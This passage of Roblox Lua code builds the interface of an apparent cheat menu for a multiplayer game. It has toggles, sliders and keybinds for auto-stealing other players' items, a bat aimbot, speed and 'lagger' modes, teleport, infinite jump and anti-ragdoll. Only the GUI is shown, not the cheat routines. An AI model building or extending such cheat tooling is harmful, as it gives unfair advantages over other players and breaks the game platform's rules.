                listeningBtn.btn.TextColor3 = Color3.fromRGB(220,220,220)
                listeningBtn = nil
            end
        end)
    end

    local function makeToggle(name, default, keybind, callback, showDropdown, showSwitch)
        if showSwitch == nil then showSwitch = true end
        local state = default
        local expanded = false
        local boundKey = nil
        local fallbackKey = keybind

        local savedName = nil
        if _GuiKeys and type(_GuiKeys[name])=="string" then
            savedName = _GuiKeys[name]
        elseif _SavedGuiKeys and type(_SavedGuiKeys[name])=="string" then
            savedName = _SavedGuiKeys[name]
        end
        if savedName then
            local okKC, kcVal = pcall(function() return Enum.KeyCode[savedName] end)
            if okKC and kcVal then keybind = savedName end
        end
        local hasKb = fallbackKey ~= nil

        local container = new("Frame",{
            Size=UDim2.new(1,0,0,46),
            BackgroundTransparency=1,
            BorderSizePixel=0,
            AutomaticSize=Enum.AutomaticSize.Y,
            ClipsDescendants=false,
        })
        new("UIListLayout",{Parent=container,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,4)})

        local modeUI = uiLayoutMode or 1
        local style3 = modeUI >= 3
        local style4 = modeUI == 4
        local r = new("Frame",{
            Parent=container,
            Size=UDim2.new(1,0,0, style4 and 52 or (style3 and 48 or 42)),
            BackgroundColor3=style4 and Color3.fromRGB(8,10,16) or (style3 and Color3.fromRGB(11,13,20) or Color3.fromRGB(18,20,26)),
            BorderSizePixel=0,
            LayoutOrder=1,
            ClipsDescendants=true,
        },{corner(style4 and 16 or (style3 and 14 or 4))})
        if style4 then
            local ring = stroke(ACCENT, 1.4, 0.4)
            ring.Parent = r
            onAccent(function(a) ring.Color = a end, r)
            local sheen = new("Frame",{
                Parent=r, Size=UDim2.new(1,0,0,1), BackgroundColor3=Color3.fromRGB(255,255,255),
                BackgroundTransparency=0.88, BorderSizePixel=0,
            })
        elseif style3 then
            local ring = stroke(ACCENT, 1.1, 0.62)
            ring.Parent = r
            onAccent(function(a) ring.Color = a end, r)
        end
        local hoverOn = style3 and Color3.fromRGB(20,24,36) or Color3.fromRGB(24,28,36)
        local hoverOff = style3 and Color3.fromRGB(14,16,24) or Color3.fromRGB(18,20,26)
        r.MouseEnter:Connect(function()
            TweenService:Create(r, TweenInfo.new(0.12), {BackgroundColor3=hoverOn}):Play()
        end)
        r.MouseLeave:Connect(function()
            TweenService:Create(r, TweenInfo.new(0.16), {BackgroundColor3=hoverOff}):Play()
        end)

        local sideBar = new("Frame",{
            Parent=r,
            Size=style3 and UDim2.new(0,3,1,0) or UDim2.new(1,0,0,2),
            Position=UDim2.new(0,0,0,0),
            BackgroundColor3=ACCENT,
            BackgroundTransparency=default and 0 or 0.85,
            BorderSizePixel=0,
        })
        if style3 then
            Instance.new("UICorner", sideBar).CornerRadius = UDim.new(0, 2)
        end
        onAccent(function(a) sideBar.BackgroundColor3 = a end, sideBar)

        new("TextLabel",{
            Parent=r,
            Size=UDim2.new(1, hasKb and -125 or -70, 1, 0),
            Position=UDim2.fromOffset(14,0),
            BackgroundTransparency=1,
            Text=name,
            Font=Enum.Font.GothamBold,
            TextSize=13,
            TextColor3=Color3.fromRGB(235,235,235),
            TextXAlignment=Enum.TextXAlignment.Left,
        })

        local dropBtn
        if showDropdown then
            dropBtn = new("TextButton",{
                Parent=r,
                Size=UDim2.fromOffset(22,22),
                Position=UDim2.new(1,-120,0.5,-11),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="v",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(160,160,160),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(5)})
            new("Frame",{
                Parent=r,
                Size=UDim2.new(0,1,0.5,0),
                Position=UDim2.new(1,-96,0.25,0),
                BackgroundColor3=Color3.fromRGB(60,60,60),
                BorderSizePixel=0,
            })
        end

        local kbBtn
        if hasKb then
            local kbW = style4 and 52 or (style3 and 44 or 36)
            local kbH = style4 and 28 or (style3 and 26 or 22)
            local kbX = style4 and -120 or (style3 and -108 or -92)
            kbBtn = new("TextButton",{
                Parent=r,
                Size=UDim2.fromOffset(kbW, kbH),
                Position=UDim2.new(1, kbX, 0.5, -kbH/2),
                BackgroundColor3=(style4 or style3) and Color3.fromRGB(6,8,14) or Color3.fromRGB(18,18,18),
                Text=(keybind and prettyKey(Enum.KeyCode[keybind])) or "--",
                Font=Enum.Font.GothamBlack,
                TextSize=style4 and 12 or (style3 and 11 or 12),
                TextColor3=(style4 or style3) and ACCENT or Color3.fromRGB(220,220,220),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(style4 and 12 or (style3 and 9 or 5)), stroke((style4 or style3) and ACCENT or Color3.fromRGB(50,50,55), style4 and 1.4 or (style3 and 1.2 or 1), style4 and 0.3 or (style3 and 0.45 or 0.5))})
            if style4 or style3 then
                onAccent(function(a)
                    kbBtn.TextColor3 = a
                    local s = kbBtn:FindFirstChildOfClass("UIStroke")
                    if s then s.Color = a end
                end, kbBtn)
            end
            new("Frame",{
                Parent=r,
                Size=UDim2.new(0,1,0.5,0),
                Position=UDim2.new(1,-53,0.25,0),
                BackgroundColor3=Color3.fromRGB(60,60,60),
                BorderSizePixel=0,
            })
        end

        local sw, dot
        if showSwitch then
            local swW = style4 and 54 or (style3 and 50 or 42)
            local swH = style4 and 28 or (style3 and 26 or 22)
            local swX = style4 and -64 or (style3 and -58 or -50)
            sw = new("TextButton",{
                Parent=r,
                Size=UDim2.fromOffset(swW, swH),
                Position=UDim2.new(1, swX, 0.5, -swH/2),
                BackgroundColor3=default and ACCENT or ((style4 or style3) and Color3.fromRGB(18,22,32) or Color3.fromRGB(32,36,44)),
                Text="",AutoButtonColor=false,BorderSizePixel=0,
            },{corner(style4 and 14 or (style3 and 13 or 6))})
            local swGlow = stroke(ACCENT, 1.2, default and 0.35 or 0.7)
            swGlow.Parent = sw
            onAccent(function(a)
                if state then sw.BackgroundColor3 = a end
                swGlow.Color = a
            end, sw)
            dot = new("Frame",{
                Parent=sw,
                Size=UDim2.fromOffset(16,16),
                Position=default and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8),
                BackgroundColor3=default and accentTextColor(ACCENT) or Color3.fromRGB(140,145,155),
                BorderSizePixel=0,
            },{corner(4)})
            onAccent(function(a)
                if state and dot and dot.Parent then
                    dot.BackgroundColor3 = accentTextColor(a)
                end
            end, dot)
        else

            local clicker = new("TextButton",{
                Parent=r,
                Size=UDim2.new(1, hasKb and -50 or 0, 1, 0),
                Position=UDim2.fromOffset(0,0),
                BackgroundTransparency=1,
                Text="",
                ZIndex=0,
            })
            clicker.MouseButton1Click:Connect(function()
                sideBar.BackgroundTransparency = 0
                TweenService:Create(sideBar,TweenInfo.new(0.45),{BackgroundTransparency=1}):Play()
                if callback then callback(not state) end
            end)
        end

        local function updateToggle(newState)
            state = newState
            if showSwitch then
                TweenService:Create(sideBar,TweenInfo.new(0.15),{BackgroundTransparency=state and 0 or 0.85}):Play()
            else

                sideBar.BackgroundTransparency = 0
                TweenService:Create(sideBar,TweenInfo.new(0.45),{BackgroundTransparency=1}):Play()
            end
            if showSwitch then
                TweenService:Create(sw,TweenInfo.new(0.15),{BackgroundColor3=state and ACCENT or Color3.fromRGB(32,36,44)}):Play()
                local g = sw:FindFirstChildOfClass("UIStroke")
                if g then TweenService:Create(g,TweenInfo.new(0.15),{Transparency=state and 0.35 or 0.7}):Play() end
                TweenService:Create(dot,TweenInfo.new(0.15,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{
                    Position=state and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8),
                    BackgroundColor3=state and accentTextColor(ACCENT) or Color3.fromRGB(140,145,155),
                }):Play()
            end
            if callback then callback(state) end
        end

        local toggleFn = function() updateToggle(not state) end
        if showSwitch then
            sw.MouseButton1Click:Connect(function() updateToggle(not state) end)
        end

        local choicePanel = new("Frame",{
            Parent=container,
            Size=UDim2.new(1,0,0,28),
            BackgroundTransparency=1,
            BorderSizePixel=0,
            Visible=false,
            LayoutOrder=2,
        })
        local v1Btn = new("TextButton",{
            Parent=choicePanel,
            Size=UDim2.new(0.5,-3,1,0),
            Position=UDim2.fromOffset(0,0),
            BackgroundColor3=Color3.fromRGB(235,235,235),
            Text="V1",
            Font=Enum.Font.GothamBold,
            TextSize=13,
            TextColor3=Color3.fromRGB(15,15,15),
            AutoButtonColor=false,
            BorderSizePixel=0,
        },{corner(10)})
        local v2Btn = new("TextButton",{
            Parent=choicePanel,
            Position=UDim2.new(0.5,3,0,0),
            Size=UDim2.new(0.5,-3,1,0),
            BackgroundColor3=Color3.fromRGB(18,18,18),
            Text="V2",
            Font=Enum.Font.GothamBold,
            TextSize=13,
            TextColor3=Color3.fromRGB(120,120,120),
            AutoButtonColor=false,
            BorderSizePixel=0,
        },{corner(10), stroke(Color3.fromRGB(40,40,40),1,0)})

        if dropBtn then
            dropBtn.MouseButton1Click:Connect(function()
                expanded = not expanded
                choicePanel.Visible = expanded
                dropBtn.Text = expanded and "^" or "v"
            end)
        end

        local function resolveKey(keyName)
            if type(keyName) ~= "string" then return nil end
            return Enum.KeyCode[keyName]
        end

        local function bindKey(kc)
            if not kc then return false end
            if boundKey and boundKey ~= kc then
                local oldCallbacks = keybindMap[boundKey]
                if oldCallbacks then
                    oldCallbacks[name] = nil
                    if not next(oldCallbacks) then keybindMap[boundKey] = nil end
                end
            end
            boundKey = kc
            keybindMap[kc] = keybindMap[kc] or {}
            keybindMap[kc][name] = toggleFn
            if _GuiKeys then _GuiKeys[name] = kc.Name end
            if name == "Drop Brainrot" and KB and KB.DropBrainrot then KB.DropBrainrot.kb = kc end
            if name == "TP Down" and KB and KB.TPFloor then KB.TPFloor.kb = kc end
            if name == "TP Bat" and KB and KB.TPBat then KB.TPBat.kb = kc end
            if name == "Auto Left" and KB and KB.AutoLeft then KB.AutoLeft.kb = kc end
            if name == "Auto Right" and KB and KB.AutoRight then KB.AutoRight.kb = kc end
            if name == "Bat Aimbot" and KB and KB.AutoBat then KB.AutoBat.kb = kc end
            if name == "Lagger Mode" and KB and KB.LaggerToggle then KB.LaggerToggle.kb = kc end
            if name == "Carry Mode" and KB and KB.SpeedToggle then KB.SpeedToggle.kb = kc end
            return true
        end

        if hasKb then
            kbBtn.MouseButton1Click:Connect(function()
                startKeyListen(kbBtn, function(kc)
                    if not bindKey(kc) then return false end
                    saveConfig()
                    return true
                end)
            end)
            local initialKey = resolveKey(keybind)
            local fallbackEnum = resolveKey(fallbackKey)
            if not bindKey(initialKey) and fallbackEnum then
                bindKey(fallbackEnum)
            end
            kbBtn.Text = boundKey and prettyKey(boundKey) or "--"
        end

        v1Btn.MouseButton1Click:Connect(function()
            v1Btn.BackgroundColor3 = ACCENT
            v1Btn.TextColor3 = accentTextColor(ACCENT)
            v2Btn.BackgroundColor3 = Color3.fromRGB(18,18,18)
            v2Btn.TextColor3 = Color3.fromRGB(120,120,120)
        end)
        v2Btn.MouseButton1Click:Connect(function()
            v2Btn.BackgroundColor3 = ACCENT
            v2Btn.TextColor3 = accentTextColor(ACCENT)
            v1Btn.BackgroundColor3 = Color3.fromRGB(18,18,18)
            v1Btn.TextColor3 = Color3.fromRGB(120,120,120)
        end)

        return container
    end

    local function makeSpeedPair(parent, leftName, leftMin, leftMax, leftDef, leftCb, rightName, rightMin, rightMax, rightDef, rightCb)
        local mode = uiLayoutMode or 1
        local style3 = mode >= 3
        local style4 = mode == 4

        if style4 then
            -- OPT4: glass dual-column speed config
            local wrap = new("Frame",{
                Parent=parent,
                Size=UDim2.new(1,0,0,0),
                AutomaticSize=Enum.AutomaticSize.Y,
                BackgroundTransparency=1,
                BorderSizePixel=0,
            })
            new("UIListLayout",{Parent=wrap, SortOrder=Enum.SortOrder.LayoutOrder, Padding=UDim.new(0,10)})

            local function fmt(n)
                n = tonumber(n) or 0
                n = math.floor(n * 10 + 0.5) / 10
                if n == math.floor(n) then return tostring(math.floor(n)) end
                return string.format("%.1f", n)
            end

            local function glassTile(name, min, max, default, callback, order)
                local value = math.clamp(tonumber(default) or min, min, max)
                local card = new("Frame",{
                    Parent=wrap,
                    Size=UDim2.new(1,0,0,70),
                    BackgroundColor3=Color3.fromRGB(8,10,16),
                    BorderSizePixel=0,
                    LayoutOrder=order,
                },{corner(18)})
                local rim = stroke(ACCENT, 1.5, 0.35)
                rim.Parent = card
                onAccent(function(a) rim.Color = a end, card)
                local sheen = new("Frame",{
                    Parent=card, Size=UDim2.new(1,0,0,1), Position=UDim2.fromOffset(0,0),
                    BackgroundColor3=Color3.fromRGB(255,255,255), BackgroundTransparency=0.85, BorderSizePixel=0,
                })
                new("TextLabel",{
                    Parent=card, Size=UDim2.new(1,-24,0,14), Position=UDim2.fromOffset(16,10),
                    BackgroundTransparency=1, Text=string.upper(name),
                    Font=Enum.Font.GothamBold, TextSize=11,
                    TextColor3=Color3.fromRGB(140,150,170), TextXAlignment=Enum.TextXAlignment.Left,
                })
                local val = new("TextBox",{
                    Parent=card, Size=UDim2.new(1,-32,0,34), Position=UDim2.fromOffset(16,28),
                    BackgroundColor3=Color3.fromRGB(5,7,12), Text=fmt(value),
                    Font=Enum.Font.GothamBlack, TextSize=22, TextColor3=ACCENT,
                    TextXAlignment=Enum.TextXAlignment.Center, ClearTextOnFocus=true, BorderSizePixel=0,
                },{corner(12), stroke(ACCENT,1.2,0.4)})
                onAccent(function(a)
                    val.TextColor3 = a
                    local s = val:FindFirstChildOfClass("UIStroke")
                    if s then s.Color = a end
                end, val)
                val.FocusLost:Connect(function()
                    local n = math.clamp(tonumber(val.Text) or value, min, max)
                    n = math.floor(n * 10 + 0.5) / 10
                    value = n
                    val.Text = fmt(n)
                    if callback then callback(n) end
                end)
                card.MouseEnter:Connect(function()
                    TweenService:Create(card, TweenInfo.new(0.14), {BackgroundColor3=Color3.fromRGB(14,16,24)}):Play()
                    TweenService:Create(rim, TweenInfo.new(0.14), {Transparency=0.12}):Play()
                end)
                card.MouseLeave:Connect(function()
                    TweenService:Create(card, TweenInfo.new(0.18), {BackgroundColor3=Color3.fromRGB(8,10,16)}):Play()
                    TweenService:Create(rim, TweenInfo.new(0.18), {Transparency=0.35}):Play()
                end)
            end
            glassTile(leftName, leftMin, leftMax, leftDef, leftCb, 1)
            glassTile(rightName, rightMin, rightMax, rightDef, rightCb, 2)
            return wrap

        elseif style3 then
            local wrap = new("Frame",{
                Parent=parent,
                Size=UDim2.new(1,0,0,0),
                AutomaticSize=Enum.AutomaticSize.Y,
                BackgroundTransparency=1,
                BorderSizePixel=0,
            })
            new("UIListLayout",{Parent=wrap, SortOrder=Enum.SortOrder.LayoutOrder, Padding=UDim.new(0,8)})

            local function fmt(n)
                n = tonumber(n) or 0
                n = math.floor(n * 10 + 0.5) / 10
                if n == math.floor(n) then return tostring(math.floor(n)) end
                return string.format("%.1f", n)
            end

            local function speedTile(name, min, max, default, callback, order)
                local value = math.clamp(tonumber(default) or min, min, max)
                local card = new("Frame",{
                    Parent=wrap,
                    Size=UDim2.new(1,0,0,72),
                    BackgroundColor3=Color3.fromRGB(10,12,18),
                    BorderSizePixel=0,
                    LayoutOrder=order,
                },{corner(16)})
                local rim = stroke(ACCENT, 1.2, 0.55)
                rim.Parent = card
                onAccent(function(a) rim.Color = a end, card)

                -- left accent strip
                local strip = new("Frame",{
                    Parent=card,
                    Size=UDim2.new(0,4,1,-16),
                    Position=UDim2.fromOffset(8,8),
                    BackgroundColor3=ACCENT,
                    BorderSizePixel=0,
                },{corner(3)})
                onAccent(function(a) strip.BackgroundColor3 = a end, strip)

                new("TextLabel",{
                    Parent=card,
                    Size=UDim2.new(1,-120,0,16),
                    Position=UDim2.fromOffset(20,10),
                    BackgroundTransparency=1,
                    Text=string.upper(name),
                    Font=Enum.Font.GothamBold,
                    TextSize=11,
                    TextColor3=Color3.fromRGB(150,158,175),
                    TextXAlignment=Enum.TextXAlignment.Left,
                })

                local val = new("TextBox",{
                    Parent=card,
                    Size=UDim2.new(0,90,0,32),
                    Position=UDim2.fromOffset(20,32),
                    BackgroundColor3=Color3.fromRGB(6,8,14),
                    Text=fmt(value),
                    Font=Enum.Font.GothamBlack,
                    TextSize=20,
                    TextColor3=ACCENT,
                    TextXAlignment=Enum.TextXAlignment.Center,
                    ClearTextOnFocus=true,
                    BorderSizePixel=0,
                },{corner(10), stroke(ACCENT,1,0.5)})
                onAccent(function(a)
                    val.TextColor3 = a
                    local s = val:FindFirstChildOfClass("UIStroke")
                    if s then s.Color = a end
                end, val)

                -- value only (no +/-)
                val.Size = UDim2.new(0, 110, 0, 32)
                val.Position = UDim2.new(1, -124, 0, 28)
                local function commit(n)
                    n = math.clamp(tonumber(n) or value, min, max)
                    n = math.floor(n * 10 + 0.5) / 10
                    value = n
                    val.Text = fmt(n)
                    if callback then callback(n) end
                end
                val.FocusLost:Connect(function() commit(val.Text) end)

                card.MouseEnter:Connect(function()
                    TweenService:Create(card, TweenInfo.new(0.12), {BackgroundColor3=Color3.fromRGB(14,16,24)}):Play()
                end)
                card.MouseLeave:Connect(function()
                    TweenService:Create(card, TweenInfo.new(0.16), {BackgroundColor3=Color3.fromRGB(10,12,18)}):Play()
                end)
            end

            speedTile(leftName, leftMin, leftMax, leftDef, leftCb, 1)
            speedTile(rightName, rightMin, rightMax, rightDef, rightCb, 2)
            return wrap
        end

        -- Default dual cell layout (opt 1 / 2)
        local wrap = new("Frame",{
            Parent=parent,
            Size=UDim2.new(1,0,0,64),
            BackgroundTransparency=1,
            BorderSizePixel=0,
        })
        local function cell(xScale, name, min, max, default, callback)
            local box = new("Frame",{
                Parent=wrap,
                Size=UDim2.new(0.5,-4,1,0),
                Position=UDim2.new(xScale, xScale>0 and 4 or 0, 0, 0),
                BackgroundColor3=Color3.fromRGB(18,20,26),
                BackgroundTransparency=0,
                BorderSizePixel=0,
            },{corner(4)})
            local edge = new("Frame",{
                Parent=box,
                Size=UDim2.new(0,3,1,0),
                BackgroundColor3=ACCENT,
                BackgroundTransparency=0.45,
                BorderSizePixel=0,
            })
            onAccent(function(a) edge.BackgroundColor3 = a end, edge)
            new("TextLabel",{
                Parent=box,
                Size=UDim2.new(1,-14,0,18),
                Position=UDim2.fromOffset(12,6),
                BackgroundTransparency=1,
                Text=name,
                Font=Enum.Font.GothamMedium,
                TextSize=12,
                TextColor3=Color3.fromRGB(200,200,210),
                TextXAlignment=Enum.TextXAlignment.Left,
            })
            local function fmtDef(n)
                n = tonumber(n) or 0
                n = math.floor(n * 10 + 0.5) / 10
                if n == math.floor(n) then return tostring(math.floor(n)) end
                return string.format("%.1f", n)
            end
            local valBox = new("TextBox",{
                Parent=box,
                Size=UDim2.new(1,-20,0,26),
                Position=UDim2.fromOffset(12,30),
                BackgroundColor3=Color3.fromRGB(10,12,16),
                Text=fmtDef(default),
                Font=Enum.Font.GothamBold,
                TextSize=14,
                TextColor3=ACCENT,
                TextXAlignment=Enum.TextXAlignment.Center,
                ClearTextOnFocus=true,
                BorderSizePixel=0,
            },{corner(4), stroke(Color3.fromRGB(40,50,60),1,0.35)})
            onAccent(function(a) valBox.TextColor3 = a end, valBox)
            valBox.FocusLost:Connect(function()
                local n = tonumber(valBox.Text)
                if n then
                    n = math.clamp(n, min, max)
                    n = math.floor(n * 10 + 0.5) / 10
                    if n == math.floor(n) then valBox.Text = tostring(math.floor(n))
                    else valBox.Text = string.format("%.1f", n) end
                    if callback then callback(n) end
                else
                    valBox.Text = tostring(default)
                end
            end)
        end
        cell(0, leftName, leftMin, leftMax, leftDef, leftCb)
        cell(0.5, rightName, rightMin, rightMax, rightDef, rightCb)
        return wrap
    end

    local function buildSpeed(parent)
        sectionLabel("Speed Configuration").Parent = parent
        makeSpeedPair(parent,
            "Normal Speed", 1, 200, NS, function(v) NS=v; saveConfig() end,
            "Carry Speed", 1, 200, CS, function(v) CS=v; saveConfig() end
        )
        sectionLabel("Lagger Mode").Parent = parent
        makeSpeedPair(parent,
            "Lagger Normal", 1, 200, LAGGER_SPEED, function(v) LAGGER_SPEED=v; saveConfig() end,
            "Lagger Carry", 1, 200, LAGGER_CARRY_SPEED, function(v) LAGGER_CARRY_SPEED=v; saveConfig() end
        )
        sectionLabel("Controls").Parent = parent
        makeToggle("Carry Mode", carrySpeedActive, "V", function(on)
            carrySpeedActive = not not on
            if carrySpeedActive and laggerModeEnabled then
                laggerModeEnabled = false
            end
            _autoSwitchWasSteal = carrySpeedActive
            if refreshSpeedModeLabel then refreshSpeedModeLabel() end
            if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
            if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
            saveConfig()
        end).Parent = parent
        makeToggle("Lagger Mode", laggerModeEnabled, "B", function(on)
            if on then
                laggerModeEnabled = true
                carrySpeedActive = false
            else
                laggerModeEnabled = false
            end
            if refreshSpeedModeLabel then refreshSpeedModeLabel() end
            if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
            if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
            saveConfig()
        end).Parent = parent
    end

    local function buildMovement(parent)
        sectionLabel("Auto Paths").Parent = parent
        makeToggle("Auto Left", autoLeftEnabled, "Z", function(on)
            if on then
                if autoRightEnabled then autoRightEnabled=false;stopAutoRight();if autoRightSetVisual then autoRightSetVisual(false) end;if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
                if autoBatEnabled then stopBatAimbot();if autoBatSetVisual then autoBatSetVisual(false) end;if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
                autoLeftEnabled=true;startAutoLeft();if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(true) end
            else
                autoLeftEnabled=false;stopAutoLeft();if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
            end
            saveConfig()
        end).Parent = parent
        makeToggle("Auto Right", autoRightEnabled, "C", function(on)
            if on then
                if autoLeftEnabled then autoLeftEnabled=false;stopAutoLeft();if autoLeftSetVisual then autoLeftSetVisual(false) end;if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
                if autoBatEnabled then stopBatAimbot();if autoBatSetVisual then autoBatSetVisual(false) end;if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
                autoRightEnabled=true;startAutoRight();if mobBtnRefs.autoRight then mobBtnRefs.autoRight(true) end
            else
                autoRightEnabled=false;stopAutoRight();if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
            end
            saveConfig()
        end).Parent = parent
        sectionLabel("Movement Settings").Parent = parent
        makeToggle("Auto TP", autoTPEnabled, nil, function(on)
            autoTPEnabled=on
            if on then startAutoTP() else stopAutoTP() end
            saveConfig()
        end).Parent = parent
        makeSlider("TP Height", 0, 500, autoTPHeight, function(v) autoTPHeight=v; saveConfig() end).Parent = parent
        makeToggle("Infinite Jump", infJumpEnabled, nil, function(on)
            infJumpEnabled=on
            if on then startHoldInfJump() else stopHoldInfJump() end
            saveConfig()
        end).Parent = parent

        do
            local modeRow = row(40)
            modeRow.Parent = parent
            new("TextLabel",{
                Parent=modeRow,
                Size=UDim2.new(0.42,0,1,0),
                Position=UDim2.fromOffset(14,0),
                BackgroundTransparency=1,
                Text="Jump Mode",
                Font=Enum.Font.GothamMedium,
                TextSize=13,
                TextColor3=Color3.fromRGB(235,235,235),
                TextXAlignment=Enum.TextXAlignment.Left,
            })
            local holdBtn, manBtn
            local function paintMode()
                local m = string.lower(tostring(infJumpMode or "manual"))
                if holdBtn then
                    holdBtn.BackgroundColor3 = (m == "hold") and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    holdBtn.TextColor3 = (m == "hold") and accentTextColor3(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
                if manBtn then
                    manBtn.BackgroundColor3 = (m == "manual") and ACCENT_COLOR or Color3.fromRGB(18,18,18)
                    manBtn.TextColor3 = (m == "manual") and accentTextColor3(ACCENT_COLOR) or Color3.fromRGB(200,200,200)
                end
            end
            holdBtn = new("TextButton",{
                Parent=modeRow,
                Size=UDim2.fromOffset(58,26),
                Position=UDim2.new(1,-126,0.5,-13),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="HOLD",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(200,200,200),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            manBtn = new("TextButton",{
                Parent=modeRow,
                Size=UDim2.fromOffset(62,26),
                Position=UDim2.new(1,-64,0.5,-13),
                BackgroundColor3=Color3.fromRGB(18,18,18),
                Text="MANUAL",
                Font=Enum.Font.GothamBold,
                TextSize=11,
                TextColor3=Color3.fromRGB(200,200,200),
                AutoButtonColor=false,
                BorderSizePixel=0,
            },{corner(6), stroke(Color3.fromRGB(50,50,55),1,0.25)})
            holdBtn.MouseButton1Click:Connect(function()
                infJumpMode = "hold"
                paintMode()
                if infJumpEnabled then stopHoldInfJump(); startHoldInfJump() end
                saveConfig()
            end)
            manBtn.MouseButton1Click:Connect(function()
                infJumpMode = "manual"
                paintMode()
                if infJumpEnabled then stopHoldInfJump(); startHoldInfJump() end
                saveConfig()
            end)
            onAccent(function() paintMode() end, holdBtn)
            paintMode()
        end

        makeToggle("Anti Ragdoll", antiRagdollEnabled, nil, function(on)
            antiRagdollEnabled=on
            if on then startAntiRagdoll() else stopAntiRagdoll() end
            saveConfig()
        end).Parent = parent
        makeToggle("Unwalk", unwalkEnabled, nil, function(on)
            unwalkEnabled=on
            if on then startUnwalk() else stopUnwalk() end
            saveConfig()
        end).Parent = parent

        -- Body Lock at bottom of Movement
        sectionLabel("Body Lock").Parent = parent
        makeToggle("Body Lock", bodyLockEnabled, nil, function(on)
            bodyLockEnabled = on
            if on then
                if startBodyLock then startBodyLock() end
            else
                if stopBodyLock then stopBodyLock() end
            end
            saveConfig()
        end).Parent = parent
        makeSlider("Body Lock Range", 5, 200, bodyLockRange or 60, function(v)
            bodyLockRange = v; saveConfig()
        end).Parent = parent
    end

    local function buildCombat(parent)
        _stealRadiusUISetters = {}
        _stealDurationUISetters = {}
        sectionLabel("Steal Configuration").Parent = parent
        local stealContainer=makeToggle("Auto Steal", Steal.AutoStealEnabled, nil, function(on)
            Steal.AutoStealEnabled=on
            if on then
                if applyStealModeParams then pcall(applyStealModeParams) end
                if stealMode == "semi" then
                    Steal.StealRadius = 10
                    if StealRadii then StealRadii.Semi = 10 end
                    if SemiSteal and SemiSteal.CONFIG then SemiSteal.CONFIG.STEAL_RANGE = 10 end
                    pcall(refreshStealRadiusUI)
                end
                startAutoSteal()
            else
                stopAutoSteal()
            end
            saveConfig()
        end)
        do
            local rFrame=stealContainer:FindFirstChildOfClass("Frame")
            if rFrame then
                for _,c in ipairs(rFrame:GetChildren()) do
                    if c:IsA("TextLabel") and c.Text=="Auto Steal" then
                        c.Size=UDim2.new(1,-152,1,0); break
                    end
                end
                -- mode cycle button
                local modeBtnStrokeRef
                local modeBtn=new("TextButton",{
                    Parent=rFrame,
                    Size=UDim2.fromOffset(84,24),
                    Position=UDim2.new(1,-142,0.5,-12),
                    BackgroundColor3=Color3.fromRGB(28,28,34),
                    BackgroundTransparency=0.1,
                    BorderSizePixel=0, ZIndex=6,
                    Font=Enum.Font.GothamBold, TextSize=10,
                    Text=stealMode=="semi" and "SemiAuto" or "Normal",
                    TextColor3=stealMode=="semi" and ACCENT or Color3.fromRGB(160,160,170),
                    AutoButtonColor=false,
                },{corner(6)})
                modeBtnStrokeRef=stroke(stealMode=="semi" and ACCENT or Color3.fromRGB(55,55,65),1,0.35)
                modeBtnStrokeRef.Parent=modeBtn
                local function updateModeBtn2()
                    local isSemi=stealMode=="semi"
                    TweenService:Create(modeBtn,TweenInfo.new(0.15),{
                        BackgroundColor3=isSemi and ACCENT_COLOR or Color3.fromRGB(28,28,34),
                        BackgroundTransparency=isSemi and 0.7 or 0.1,
                    }):Play()
                    modeBtn.TextColor3=isSemi and ACCENT_COLOR or Color3.fromRGB(160,160,170)
                    if modeBtnStrokeRef then modeBtnStrokeRef.Color=isSemi and ACCENT_COLOR or Color3.fromRGB(55,55,65) end
                    modeBtn.Text=isSemi and "SemiAuto" or "Normal"
                end
                updateModeBtn2()
                onAccent(function(a)
                    if stealMode=="semi" then
                        modeBtn.TextColor3=a
                        if modeBtnStrokeRef then modeBtnStrokeRef.Color=a end
                    end
                end, modeBtn)
                modeBtn.MouseButton1Click:Connect(function()
                    if (uiLayoutMode or 1) == 4 then return end
                    local wasOn=Steal.AutoStealEnabled
                    if wasOn then stopAutoSteal() end
                    stealMode=(stealMode=="normal") and "semi" or "normal"
                    if applyStealModeParams then pcall(applyStealModeParams) end
                    updateModeBtn2(); saveConfig()
                    if wasOn then startAutoSteal() end
                    TweenService:Create(modeBtn,TweenInfo.new(0.08),{Size=UDim2.fromOffset(80,20)}):Play()
                    task.delay(0.1,function()
                        TweenService:Create(modeBtn,TweenInfo.new(0.15,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Size=UDim2.fromOffset(84,24)}):Play()
                    end)
                end)
                modeBtn.MouseEnter:Connect(function() TweenService:Create(modeBtn,TweenInfo.new(0.12),{BackgroundTransparency=0}):Play() end)
                modeBtn.MouseLeave:Connect(function() updateModeBtn2() end)
                if (uiLayoutMode or 1) == 4 then
                    modeBtn.Visible = false
                    stealMode = "normal"
                end
            end
        end
        stealContainer.Parent = parent

        do
            local radiusRow = makeSlider("Radius", 1, 100, (stealMode=="semi") and 10 or Steal.StealRadius, function(v)
                Steal.StealRadius = v
                if stealMode == "semi" then
                    StealRadii.Semi = v
                    if SemiSteal and SemiSteal.CONFIG then SemiSteal.CONFIG.STEAL_RANGE = v end
                else
